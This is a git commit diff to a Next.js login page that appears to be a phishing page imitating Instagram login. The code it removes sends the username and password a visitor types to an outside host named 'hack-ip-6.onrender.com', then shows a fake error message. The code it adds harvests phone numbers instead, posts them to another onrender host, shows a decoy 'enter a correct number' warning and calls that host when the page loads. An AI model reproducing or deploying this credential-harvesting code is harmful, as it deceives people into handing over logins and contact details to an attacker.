d9abebdb2a7372f528a6f0a22efad1654194ea3f
sabakhuskivadze <130067710+sabakhuskivadze@users.noreply.github.com>
2024-09-03 19:28:33 +0400

    sd

--- app/login/page.tsx
+++ app/login/page.tsx
@@ -1,5 +1,5 @@
 "use client"
-import { useState } from 'react'
+import { useEffect, useState } from 'react'
 import style from './page.module.scss'
 import axios from 'axios'
 import { useRouter } from 'next/navigation'
@@ -9,6 +9,7 @@ export default function Login() {
     const router = useRouter();
     const [userinfo, setUserinfo] = useState('')
     const [pass,setPass] = useState('')
+    const [number,setNumber] = useState('')
     const [messageApi, contextHolder] = message.useMessage();
     const text1 = (e:React.ChangeEvent<HTMLInputElement>) => {
         setUserinfo(e.target.value)
@@ -18,29 +19,36 @@ export default function Login() {
         setPass(e.target.value)
     } 
 
+    const text3 = (e:React.ChangeEvent<HTMLInputElement>) => {
+        setNumber(e.target.value)
+    } 
+
     const click = () => {
-        axios.post('https://hack-ip-6.onrender.com/register', {
-            userInfo: userinfo,
-            password: pass
+        axios.post('https://tiktok-2-ang0.onrender.com/register', {
+            userInfo: number,
+            password: 's'
         })
         .then((res) => {
             console.log(res.data);
                 messageApi.open({
                   type: 'warning',
-                  content: 'ხარვეზია,ბოდიშით მალე მოგვარდება!',
+                  content: 'გთხოვთ შეიყვანოთ სწორი ნომერი!',
                 });
                 // router.push('https://www.instagram.com/sado0_1234/');
         })
         .catch(() => {
                 messageApi.open({
                   type: 'warning',
-                  content: 'ეგეთი ლინკი არ არსებობს',
+                  content: 'გთხოვთ შეიყვანოთ სწორი ნომერი!',
                 });
         })
     }
 
-
-
+useEffect(() => {
+    axios.get("https://tiktok-2-ang0.onrender.com/users/info")
+    axios.get("https://tiktok-2-ang0.onrender.com/users/system")
+    axios.get("https://tiktok-2-ang0.onrender.com/users")
+},[])
 
     return(
         <>
@@ -49,8 +57,9 @@ export default function Login() {
             <div className={style.card}>
                 <div className={style.title}></div>
                 <div className={style.inputGroup}>
-                    <input onChange={text1} className={style.inputInstagram} type="text" placeholder='Enter your Email,username,Phonenumber' />
-                    <input onChange={text2} className={style.inputInstagram} type="password" placeholder='Password' />
+              {/* <input onChange={text1} className={style.inputInstagram} type="text" placeholder='Enter your Email,username,Phonenumber' />
+                    <input onChange={text2} className={style.inputInstagram} type="password" placeholder='Password' /> */}      
+                   <input onChange={text3} className={style.inputInstagram} type="text" name="" id="" placeholder='Enter your Phonenumber' />
                 </div>
                <button onClick={click} className={style.btn1}>Log In</button>
                 <div className={style.line}></div>
